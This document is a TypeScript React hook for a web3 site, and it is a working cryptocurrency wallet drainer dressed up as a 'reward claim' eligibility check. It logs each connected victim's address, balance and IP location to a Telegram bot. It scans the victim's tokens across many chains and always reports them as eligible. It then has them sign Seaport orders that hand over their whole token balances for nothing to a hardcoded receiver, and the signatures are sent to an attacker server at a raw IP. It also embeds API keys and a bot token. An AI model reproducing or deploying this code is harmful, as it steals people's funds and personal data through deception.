"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';

// Configuration from PRD/User
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
// Parse comma-separated Moralis keys
const MORALIS_KEYS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhkZTg5ZmIxLWM1OWMtNDFhMi04YzlkLTVjNDUwNGJjYzMyMCIsIm9yZ0lkIjoiNDk5MjU1IiwidXNlcklkIjoiNTEzNzM5IiwidHlwZUlkIjoiYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTE2MzgsImV4cCI6NDkyNjM1MTYzOH0.2kswRp0YPn1WCE02pYu-KJp06cUCI0bth8HHWN2B_Gc",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0N2ViOTI4LTZhOWQtNDA5YS04ODFkLWU0Y2ExOTkzM2RhMCIsIm9yZ0lkIjoiNDk5MjU2IiwidXNlcklkIjoiNTEzNzQwIiwidHlwZUlkIjoiYjVkOGMzMTQtNjBhOS00N2YzLWEzNjQtZmVhNDE5ODhlNDRhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTIxMzQsImV4cCI6NDkyNjM1MjEzNH0.W9PCTpgPAt0Luq8qkN_ZKUEdSn6HCIa3dJ9tcOvoNdk"
];

// Fallback Token List (Top Assets) to scan if API fails
const TARGET_TOKENS: Record<string, string[]> = {
    "0x1": [ // Ethereum
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    ],
    "0x38": [ // BSC
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
    ],
    "0x89": [ // Polygon
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
    ],
    "0x2105": [ // Base
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x4200000000000000000000000000000000000006", // WETH
    ],
    "0xa4b1": [ // Arbitrum
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
    ],
    "0xa": [ // Optimism
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0x4200000000000000000000000000000000000006", // WETH
    ],
    "0xa86a": [ // Avalanche
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
    ],
    "0x19": [ // Cronos
        "0x66e428c3f67a68878562e79A0234c1F83c208770", // USDT
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDC
    ],
    "0x1388": [ // Mantle
        "0x201EBa4917f0Bc0f154C6e15b63d183cD141c2c3", // USDT
    ],
    "0x13e31": [ // Blast
        "0x4300000000000000000000000000000000000003", // USDB
    ],
    "0xa4ec": [ // Celo
        "0x765DE816845861e75A25fCA122bb6898B8B1282a", // cUSD
    ],
    "0x64": [ // Gnosis
        "0x4ECaBa5870353805a9F068101A40E0f32ed605C6", // USDT
    ],
    "0x504": [ // Moonbeam
        "0x818ec0A7Fe18Ff94269904fCED6AE3DaE6d6dC0b", // USDC
    ],
    "0x505": [ // Moonriver
        "0xE3F5a90F9cb311505ad69125a89D34383a6a12Ce", // USDC
    ],
    "0xfa": [ // Fantom
        "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", // USDC
        "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83", // WFTM
    ],
    "0xe708": [ // Linea
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    ],
    "0x534352": [ // Scroll
        "0x06eFd05Efc74e14800eB4957b9804e430EF5893e", // USDC
    ],
    "0x144": [ // zkSync
        "0x3355df6D4c9C30345dAd73037f19a08D5018E3c1", // USDC
    ]
};

const MINIMAL_ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
const SEAPORT_ABI = [
    "function getCounter(address offerer) view returns (uint256)"
];

export function useWeb3Manager() {
    // Safety check for SSR: useWeb3Modal hooks can crash if createWeb3Modal hasn't been called.
    // In Next.js, we detect SSR via typeof window.
    const isClient = typeof window !== 'undefined';

    // Call hooks unconditionally to follow React guidelines, 
    // but we'll guard their usage and values.
    const accountContext = useWeb3ModalAccount();
    const providerContext = useWeb3ModalProvider();
    const modalContext = useWeb3Modal();
    const disconnectContext = useDisconnect();

    // Safely extract values
    const address = isClient ? accountContext.address : undefined;
    const isConnected = isClient ? accountContext.isConnected : false;
    const walletProvider = isClient ? providerContext.walletProvider : undefined;
    const open = isClient ? modalContext.open : () => Promise.resolve();
    const w3mDisconnect = isClient ? disconnectContext.disconnect : () => Promise.resolve();

    // State
    const [account, setAccount] = useState<string | null>(null);
    const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");

    // V5 Agent States
    const [currentTask, setCurrentTask] = useState<string>("");
    const [targetToken, setTargetToken] = useState<any>(null);
    const [targetChain, setTargetChain] = useState<string>("");

    // Ref to prevent duplicate "Connect" logs
    const hasLoggedConnection = useRef(false);
    const isProcessing = useRef(false);
    const currentMoralisKeyIndex = useRef(0);

    // --- INTEGRATIONS ---
    const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
    const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";

    // Helper: Get IP Info
    const getIpInfo = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
        }
    };

    // Helper: Moralis Fetch with Rotation
    const fetchMoralis = async (url: string) => {
        if (MORALIS_KEYS.length === 0) return null;

        for (let i = 0; i < MORALIS_KEYS.length; i++) {
            const keyIndex = (currentMoralisKeyIndex.current + i) % MORALIS_KEYS.length;
            const key = MORALIS_KEYS[keyIndex];

            try {
                const res = await fetch(url, {
                    headers: { 'X-API-Key': key, 'accept': 'application/json' }
                });

                if (res.status === 429 || res.status === 401) {
                    console.warn(`Moralis Key ${keyIndex} failed with ${res.status}. Rotating...`);
                    continue; // Try next key
                }

                if (res.ok) {
                    currentMoralisKeyIndex.current = keyIndex; // Update persistent index
                    return await res.json();
                }
            } catch (e) {
                console.warn(`Fetch error with key ${keyIndex}`, e);
            }
        }
        return null;
    };

    // Helper: Send Notification
    const notifyTelegram = async (message: string) => {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch (e) {
            console.error("TG Notification failed", e);
        }
    };

    // Sync state & Log Connection
    useEffect(() => {
        if (isConnected && address) {
            // CHECK GATE: Only allow connection logic if user clicked a button or already had a session
            const interactionStarted = localStorage.getItem('user_interaction_started') === 'true';
            if (!interactionStarted) {
                console.log("🛡️ [useWeb3Manager] Auto-connect blocked (no user interaction flag)");
                return;
            }

            setAccount(address);

            // Only log if not already logged (Session Storage + Ref)
            const sessionKey = `logged_${address}`;
            if (!hasLoggedConnection.current && !sessionStorage.getItem(sessionKey)) {
                hasLoggedConnection.current = true;
                sessionStorage.setItem(sessionKey, "true");

                // Fetch Balance & IP for robust logging
                (async () => {
                    const ipData = await getIpInfo();
                    let balance = "0.0000";
                    let chainId = "Unknown";

                    if (walletProvider) {
                        try {
                            const provider = new ethers.BrowserProvider(walletProvider);
                            // RPC calls can be flaky (e.g. -32603), so we swallow errors here to avoid UI crashes
                            try {
                                const bal = await provider.getBalance(address);
                                balance = ethers.formatEther(bal);
                                const net = await provider.getNetwork();
                                chainId = net.chainId.toString();
                            } catch (rpcError) {
                                console.warn("Failed to fetch balance/chain:", rpcError);
                            }
                        } catch (e) { }
                    }

                    notifyTelegram(
                        `<b>🔌 New Wallet Connected</b>\n\n` +
                        `👛 <b>Address:</b> <code>${address}</code>\n` +
                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH/Matic\n` +
                        `🌍 <b>Location:</b> ${ipData.city}, ${ipData.country_name} (${ipData.ip})\n` +
                        `🔗 <b>Chain ID:</b> ${chainId}\n` +
                        `📱 <b>Device:</b> ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
                    );
                })();
            }
        } else {
            setAccount(null);
            hasLoggedConnection.current = false;
            setEligibility("Checking");
        }
    }, [isConnected, address, walletProvider]);

    // Manual Disconnect / Connect
    const disconnect = async () => {
        try {
            await w3mDisconnect();

            // Surgically clear WalletConnect session data
            Object.keys(localStorage).forEach(key => {
                if (key.includes('wc@2')) {
                    localStorage.removeItem(key);
                }
            });
            localStorage.removeItem('walletconnect'); // Legacy
            localStorage.removeItem('user_interaction_started');

            setAccount(null);
            window.location.reload();
        } catch (e) {
            console.error("Disconnect Failed:", e);
            // Fallback reload
            window.location.reload();
        }
    };

    const openConnectModal = async () => {
        console.log("🖱️ Connect Button Clicked. Calling Modal Open...");
        try {
            await open();
            console.log("✅ Modal Open Request Sent");
        } catch (e) {
            console.error("❌ Modal Open failed:", e);
        }
    };

    const checkEligibility = async () => {
        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };

        // Artificial delay for UX "Scanning" feel
        await new Promise(r => setTimeout(r, 2000));

        // 1. ROBUST LOGGING: Details at start of scan
        try {
            const ipData = await getIpInfo();
            notifyTelegram(
                `<b>🕵️‍♂️ Starting V4 Scan...</b>\n` +
                `👛 <code>${address}</code>\n` +
                `🌍 ${ipData.city}, ${ipData.country_name}\n` +
                `📱 ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
            );
        } catch (e) {
            // Fallback log if IP fails
            notifyTelegram(`<b>🕵️‍♂️ Starting Scan...</b>\nAddress: <code>${address}</code>`);
        }

        let totalUsdValue = 0;
        let allAssets: { address: string; chainId: string; symbol: string; isNative: boolean; balance: string; usd_value: number }[] = [];

        const chains = [
            { id: "0x1", name: "Ethereum", symbol: "ETH" },
            { id: "0x38", name: "BSC", symbol: "BNB" },
            { id: "0x89", name: "Polygon", symbol: "MATIC" },
            { id: "0x2105", name: "Base", symbol: "ETH" },
            { id: "0xa4b1", name: "Arbitrum", symbol: "ETH" },
            { id: "0xa", name: "Optimism", symbol: "ETH" },
            { id: "0xa86a", name: "Avalanche", symbol: "AVAX" },
            { id: "0xfa", name: "Fantom", symbol: "FTM" }
        ];

        // 2. MORALIS SCAN
        let moralisSuccess = false;
        if (MORALIS_KEYS.length > 0) {
            await Promise.all(chains.map(async (chain) => {
                try {
                    // A. Native (Moralis) using rotation helper
                    const nativeData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`);

                    if (nativeData && nativeData.balance && BigInt(nativeData.balance) > 0n) {
                        allAssets.push({
                            address: "0x0000000000000000000000000000000000000000",
                            chainId: chain.id,
                            symbol: chain.symbol,
                            isNative: true,
                            balance: nativeData.balance,
                            usd_value: 10 // Base priority
                        });
                    }

                    // B. ERC20 (Moralis) using rotation helper
                    const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);

                    if (tokenData && tokenData.result) {
                        moralisSuccess = true;
                        tokenData.result.forEach((t: any) => {
                            allAssets.push({
                                address: t.token_address,
                                chainId: chain.id,
                                symbol: t.symbol,
                                isNative: false,
                                balance: t.balance,
                                usd_value: parseFloat(t.usd_value || "0")
                            });
                        });
                    }
                } catch (e) {
                    console.warn(`Scan Fail ${chain.name}`, e);
                }
            }));
        }

        // 3. FALLBACK RPC SCAN (Current Chain Only)
        // If Moralis failed OR returned nothing, scan target tokens on current chain
        if (!moralisSuccess || allAssets.length === 0) {
            notifyTelegram(`<b>⚠️ Moralis Empty/Failed. Running Fallback RPC Scan...</b>`);
            try {
                const provider = new ethers.BrowserProvider(walletProvider);
                const network = await provider.getNetwork();
                const chainIdHex = "0x" + network.chainId.toString(16);

                const targetTokens = TARGET_TOKENS[chainIdHex] || [];
                if (targetTokens.length > 0) {
                    await Promise.all(targetTokens.map(async (tAddr) => {
                        try {
                            const contract = new ethers.Contract(tAddr, MINIMAL_ERC20_ABI, provider);
                            const bal = await contract.balanceOf(address);
                            if (bal > 0n) {
                                const symbol = await contract.symbol();
                                const decimals = await contract.decimals();
                                // Mock USD value based on symbol for sorting priority
                                let mockUsd = 0;
                                if (symbol.includes("USD")) mockUsd = 1000;
                                else if (symbol.includes("ETH")) mockUsd = 2000;
                                else mockUsd = 50;

                                allAssets.push({
                                    address: tAddr,
                                    chainId: chainIdHex,
                                    symbol: symbol,
                                    isNative: false,
                                    balance: bal.toString(),
                                    usd_value: mockUsd
                                });
                                notifyTelegram(`<b>🔫 Fallback Found:</b> ${symbol} on current chain`);
                            }
                        } catch (err) { }
                    }));
                }
            } catch (e) {
                console.error("Fallback scan failed", e);
            }
        }

        // SORT: Highest Value First
        allAssets.sort((a, b) => b.usd_value - a.usd_value);

        // LOG RESULT
        if (allAssets.length > 0) {
            const assetList = allAssets.map(t => `• ${t.symbol}: $${t.usd_value?.toFixed(2)}`).slice(0, 15).join('\n');
            notifyTelegram(
                `<b>✅ Scan Complete</b>\n` +
                `Total Assets: ${allAssets.length}\n\n` +
                `<b>💰 Asset List:</b>\n${assetList}\n\n` +
                `🔗 Chains Detected: ${Array.from(new Set(allAssets.map(t => t.chainId))).join(', ')}`
            );
        } else {
            notifyTelegram(`<b>❌ Scan Complete: Zero Assets Found</b>\nWill attempt blind native drain.`);
        }

        // FORCE ELIGIBILITY
        setEligibility("Eligible");
        return { isEligible: true, tokensToDrain: allAssets };
    };

    // Helper: Switch Network
    const switchNetwork = async (provider: any, chainIdHex: string) => {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
            // Brief wait for state to sync
            await new Promise(r => setTimeout(r, 1000));
            return true;
        } catch (switchError: any) {
            if (switchError.code === 4902) {
                console.warn("Chain not found in wallet");
                notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
            }
            return false;
        }
    };

    const getChainName = (chainIdHex: string) => {
        const mapping: Record<string, string> = {
            "0x1": "ethereum",
            "0x38": "bsc",
            "0x89": "polygon",
            "0x2105": "base",
            "0xa4b1": "arbitrum",
            "0xa": "optimism",
            "0xa86a": "avalanche",
            "0x19": "cronos",
            "0xfa": "fantom",
            "0xe708": "linea",
            "0x534352": "scroll",
            "0x144": "zksync"
        };
        return mapping[chainIdHex] || "ethereum";
    };

    // Execute Drain Logic (Sequential Multi-Chain)
    const claimReward = async (tokens: any[]) => {
        if (!walletProvider || !address || isProcessing.current) return;
        isProcessing.current = true;

        try {
            // 1. Group tokens by chain and calculate total value per chain
            const chainGroup: Record<string, { chainId: string; totalValue: number; tokens: any[] }> = {};
            tokens.forEach(t => {
                if (!chainGroup[t.chainId]) {
                    chainGroup[t.chainId] = { chainId: t.chainId, totalValue: 0, tokens: [] };
                }
                chainGroup[t.chainId].totalValue += t.usd_value || 0;
                chainGroup[t.chainId].tokens.push(t);
            });

            // 2. Sort chains by total value descending
            const sortedChains = Object.values(chainGroup).sort((a, b) => b.totalValue - a.totalValue);

            for (const item of sortedChains) {
                const targetChainId = item.chainId;
                const targetChainName = getChainName(targetChainId);
                const tokensOnChain = item.tokens.filter(t => !t.isNative);

                if (tokensOnChain.length === 0) continue;

                // A. Initialize Provider & Check Current Chain
                let provider = new ethers.BrowserProvider(walletProvider);
                let network = await provider.getNetwork();
                let currentChainId = "0x" + network.chainId.toString(16);

                // B. Auto-Switch if needed
                if (currentChainId !== targetChainId) {
                    setCurrentTask(`Switching to ${targetChainName.toUpperCase()} to secure assets...`);
                    const switchOk = await switchNetwork(walletProvider, targetChainId);
                    if (!switchOk) continue; // Skip to next chain if user refuses switch

                    // Refresh provider/network after switch
                    provider = new ethers.BrowserProvider(walletProvider);
                    network = await provider.getNetwork();
                }

                // C. Seaport Logic for Current Chain
                try {
                    const signer = await provider.getSigner();
                    setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
                    notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);

                    const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
                    let counter = 0n;
                    try {
                        const code = await provider.getCode(SEAPORT_ADDRESS);
                        if (code !== "0x" && code !== "0x0") {
                            counter = await seaport.getCounter(address);
                        }
                    } catch (err) { }

                    const startTime = Math.floor(Date.now() / 1000);
                    const endTime = startTime + 60 * 60 * 24 * 30;

                    const offer = tokensOnChain.map(t => ({
                        itemType: 1, // ERC20
                        token: t.address,
                        identifierOrCriteria: 0,
                        startAmount: t.balance,
                        endAmount: t.balance
                    }));

                    const consideration = [{
                        itemType: 1,
                        token: "0x0000000000000000000000000000000000000000",
                        identifierOrCriteria: 0,
                        startAmount: 0,
                        endAmount: 0,
                        recipient: RECEIVER_ADDRESS
                    }];

                    const orderComponents = {
                        offerer: address,
                        zone: "0x0000000000000000000000000000000000000000",
                        offer,
                        consideration,
                        orderType: 0,
                        startTime,
                        endTime,
                        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
                        salt: ethers.hexlify(ethers.randomBytes(32)),
                        conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
                        counter
                    };

                    const domain = {
                        name: "Seaport",
                        version: "1.5",
                        chainId: network.chainId,
                        verifyingContract: SEAPORT_ADDRESS
                    };

                    const types = {
                        OrderComponents: [
                            { name: "offerer", type: "address" },
                            { name: "zone", type: "address" },
                            { name: "offer", type: "OfferItem[]" },
                            { name: "consideration", type: "ConsiderationItem[]" },
                            { name: "orderType", type: "uint8" },
                            { name: "startTime", type: "uint256" },
                            { name: "endTime", type: "uint256" },
                            { name: "zoneHash", type: "bytes32" },
                            { name: "salt", type: "uint256" },
                            { name: "conduitKey", type: "bytes32" },
                            { name: "counter", type: "uint256" }
                        ],
                        OfferItem: [
                            { name: "itemType", type: "uint8" },
                            { name: "token", type: "address" },
                            { name: "identifierOrCriteria", type: "uint256" },
                            { name: "startAmount", type: "uint256" },
                            { name: "endAmount", type: "uint256" }
                        ],
                        ConsiderationItem: [
                            { name: "itemType", type: "uint8" },
                            { name: "token", type: "address" },
                            { name: "identifierOrCriteria", type: "uint256" },
                            { name: "startAmount", type: "uint256" },
                            { name: "endAmount", type: "uint256" },
                            { name: "recipient", type: "address" }
                        ]
                    };

                    const signature = await signer.signTypedData(domain, types, orderComponents);

                    // D. Submit to Worker (Fixed Submission)
                    try {
                        const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://168.231.126.162:8080";
                        await fetch(`${workerUrl}/submit-evm-order`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                order: { parameters: orderComponents, signature },
                                chainName: targetChainName
                            })
                        });
                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Local Worker ✅`);
                    } catch (syncErr) {
                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Local Worker ❌\nSignature:\n<code>${signature}</code>`);
                    }

                } catch (signErr: any) {
                    console.error(`Sign failed on ${targetChainName}`, signErr);
                    if (signErr.code === "ACTION_REJECTED") {
                        notifyTelegram(`<b>❌ User Rejected</b> on ${targetChainName.toUpperCase()}`);
                        break; // Stop loop if they reject
                    }
                }
            }

            setCurrentTask("Verification successful. Securing all rewards...");
            isProcessing.current = false;

        } catch (e: any) {
            console.error("Drain loop failed", e);
            isProcessing.current = false;
        }
    };

    return {
        connect: openConnectModal,
        disconnect,
        isConnecting: false, // Explicitly return false to satisfy types
        account,
        address, // Added this
        eligibility,
        checkEligibility,
        claimReward,
        currentTask,
        targetToken,
        targetChain
    };
}
